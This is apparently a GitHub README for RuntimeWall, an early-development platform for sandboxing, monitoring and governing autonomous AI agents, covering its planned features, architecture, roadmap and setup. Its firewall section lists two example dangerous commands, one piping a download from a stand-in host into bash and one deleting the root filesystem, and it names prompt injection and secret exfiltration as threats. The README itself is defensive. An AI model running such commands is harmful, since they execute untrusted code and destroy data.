# RuntimeWall

<div align="center">

### Security-first runtime and governance platform for autonomous AI agents.

_Run AI agents securely inside isolated sandboxes with runtime monitoring, session replay, MCP security, and observability._

<p align="center">
  <a href="#features"><strong>Features</strong></a> ·
  <a href="#architecture"><strong>Architecture</strong></a> ·
  <a href="#tech-stack"><strong>Tech Stack</strong></a> ·
  <a href="#roadmap"><strong>Roadmap</strong></a> ·
  <a href="#quick-start"><strong>Quick Start</strong></a> ·
  <a href="#contributing"><strong>Contributing</strong></a>
</p>

<p align="center">
  <img src="https://img.shields.io/badge/status-early%20development-yellow" alt="Status" />
  <img src="https://img.shields.io/badge/License-Apache%202.0-blue.svg" alt="License" />
  <img src="https://img.shields.io/badge/runtime-security-blue" alt="Runtime Security" />
  <img src="https://img.shields.io/badge/mcp-security-red" alt="MCP Security" />
  <img src="https://img.shields.io/badge/docker-runtime-green" alt="Docker Runtime" />
</p>

</div>

> **Project status:** Early development. This repository currently contains project documentation and licensing. Application code (`apps/`, `runtime/`, etc.) is landing incrementally — see the [roadmap](#roadmap) and [open issues](https://github.com/RuntimeWall/RuntimeWall/issues).

---

## Why RuntimeWall?

AI agents are rapidly gaining:

- Filesystem access
- Terminal execution
- Browser automation
- GitHub permissions
- Cloud infrastructure control
- Autonomous deployment capabilities

The ecosystem still lacks:

- Runtime isolation
- AI-native security and governance
- Observability and session replay
- MCP protection
- Threat detection at execution time

**RuntimeWall** is building the missing infrastructure layer.

> Think **Kubernetes + CrowdStrike + Browserbase + Vault** — for AI agents.

---

## What is RuntimeWall?

RuntimeWall is an open-source runtime platform for running autonomous AI agents inside isolated execution environments. It is designed to provide:

| Capability | Description |
|------------|-------------|
| **Sandboxed execution** | Isolated Docker / Kubernetes runtimes for agents |
| **Runtime firewall** | Block dangerous commands, exfiltration, and abuse |
| **Observability** | Logs, metrics, and full session replay |
| **MCP security** | Tool isolation, permissions, and runtime monitoring |
| **Browser infrastructure** | Playwright-based agents in isolated Chromium |
| **Secret isolation** | Scoped credentials — agents never see raw secrets |

---

## Features

_Planned capabilities — see [roadmap](#roadmap) for delivery phases._

### Secure sandboxed execution

Run agents such as Claude Code, Codex, OpenHands, Aider, or custom agents inside isolated runtime environments.

### Runtime AI firewall

Detect and block dangerous behavior before or during execution, including:

- Dangerous shell commands (e.g. `curl evil.sh | bash`, `rm -rf /`)
- Prompt injection patterns
- Secret exfiltration
- Malicious package installs
- Suspicious network activity

### Session replay and observability

Replay and audit:

- Terminal commands
- Prompts and model I/O
- Browser actions
- File changes
- Network activity

### MCP runtime security

Execute MCP tools with:

- Isolated execution
- Permission boundaries
- Signed tool verification
- Runtime monitoring
- Tool-level access controls

### Browser agent infrastructure

Run browser agents using Playwright, isolated Chromium containers, session recording, and remote browser runtimes.

### Secret isolation

Agents do not receive long-lived credentials directly. Planned support for:

- Temporary, scoped credentials
- Secret proxying and runtime token injection
- Isolated environment boundaries

---

## Architecture

```text
┌───────────────────────┐
│    Frontend UI        │
│  Next.js Dashboard    │
└──────────┬────────────┘
           │
           ▼
┌───────────────────────┐
│     API Gateway       │
│        Go API         │
└──────────┬────────────┘
           │
           ▼
┌───────────────────────┐
│ Runtime Orchestrator  │
│ Docker / Kubernetes   │
└──────────┬────────────┘
           │
           ▼
┌───────────────────────┐
│     AI Sandboxes      │
│ Claude / Codex / MCP  │
└──────────┬────────────┘
           │
           ▼
┌───────────────────────┐
│ Security Monitoring   │
│ Firewall + Observability │
└───────────────────────┘
```

---

## Tech Stack

| Layer | Technology |
|-------|------------|
| Frontend | Next.js, Tailwind CSS |
| Backend | Go |
| Runtime | Docker (Kubernetes planned) |
| Database | PostgreSQL |
| Terminal | xterm.js |
| Realtime | WebSockets |
| Monitoring | Grafana, Prometheus |
| Browser runtime | Playwright |
| AI gateway | LiteLLM |

---

## Roadmap

### Phase 1 — MVP runtime

- [ ] Docker sandbox runtime
- [ ] Web terminal attach
- [ ] Session management
- [ ] Runtime logs and command monitoring
- [ ] Dangerous command detection
- [ ] Basic runtime firewall

### Phase 2 — Security and agents

- [ ] Secret isolation and proxying
- [ ] Session replay
- [ ] MCP runtime security
- [ ] Browser runtime (Playwright)
- [ ] MCP security scanning

### Phase 3 — Platform and enterprise

- [ ] Kubernetes runtime orchestration
- [ ] Multi-agent orchestration
- [ ] Distributed runtime scheduling
- [ ] GPU runtime support
- [ ] RBAC, SSO / SAML
- [ ] Governance policies and compliance tooling
- [ ] AI SOC dashboard, risk scoring, threat intelligence

---

## Repository structure

**Current layout:**

```text
RuntimeWall/
├── LICENSE
└── README.md
```

**Target layout:**

```text
RuntimeWall/
├── apps/
│   ├── web/          # Next.js dashboard
│   └── api/          # Go API gateway
├── runtime/
│   ├── docker/
│   ├── security/
│   └── sandbox/
├── packages/
│   ├── cli/
│   └── sdk/
├── infra/
│   ├── docker/
│   ├── kubernetes/
│   └── monitoring/
└── docs/
```

---

## Quick Start

> Quick Start will be enabled as `apps/web` and `apps/api` land in the repository. Track progress on the [roadmap](#roadmap).

### Prerequisites (planned)

- Node.js 20+
- Go 1.22+
- Docker 24+

### Clone the repository

```bash
git clone https://github.com/RuntimeWall/RuntimeWall.git
cd RuntimeWall
```

### Frontend (coming soon)

```bash
cd apps/web
npm install
npm run dev
```

### API (coming soon)

```bash
cd apps/api
go run ./cmd/server
```

### One-command local dev (planned)

```bash
docker compose up
```

---

## Vision

The future of software is increasingly autonomous. AI agents will deploy infrastructure, manage clusters, write production code, operate browsers, and automate security operations — but only safely if we add runtime isolation, observability, governance, and policy enforcement.

**RuntimeWall aims to become the secure operating system for autonomous AI agents.**

---

## Contributing

We welcome contributors — security researchers, infrastructure engineers, AI engineers, DevOps, and MCP ecosystem builders.

1. Fork the repository and create a branch:

   ```bash
   git checkout -b feat/your-feature
   ```

2. Commit your changes:

   ```bash
   git commit -m "Add your feature"
   ```

3. Push and open a pull request:

   ```bash
   git push origin feat/your-feature
   ```

Please open an [issue](https://github.com/RuntimeWall/RuntimeWall/issues) before large changes so we can align on design.

For security vulnerabilities, please do **not** open a public issue — contact the maintainers privately (see `SECURITY.md` when published).

---

## License

[Apache License 2.0](LICENSE)

---

<p align="center">
  <strong>RuntimeWall</strong> — Security and governance infrastructure for autonomous AI agents.
</p>
